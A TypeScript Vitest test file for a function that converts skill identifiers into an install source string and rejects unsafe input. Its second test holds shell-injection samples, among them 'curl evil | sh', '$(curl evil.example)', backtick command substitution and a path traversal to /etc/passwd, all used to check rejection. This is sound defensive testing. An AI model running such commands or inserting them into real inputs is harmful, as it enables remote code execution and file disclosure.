import { describe, expect, it } from 'vitest';
import { toSkillsAddSource } from './skills-add-source.js';

describe('toSkillsAddSource', () => {
  it('rewrites a 3-part id and leaves shorter ids alone', () => {
    expect(toSkillsAddSource('anthropics/skills/frontend-design')).toBe('anthropics/skills@frontend-design');
    expect(toSkillsAddSource('obra/react-patterns')).toBe('obra/react-patterns');
    expect(toSkillsAddSource('tdd')).toBe('tdd');
  });

  it('refuses shell and flag injection', () => {
    expect(toSkillsAddSource('obra/x; curl evil | sh')).toBeNull();
    expect(toSkillsAddSource('$(curl evil.example)')).toBeNull();
    expect(toSkillsAddSource('--help')).toBeNull();
    expect(toSkillsAddSource('owner/../../etc/passwd')).toBeNull();
    expect(toSkillsAddSource('obra/x`id`')).toBeNull();
  });
});
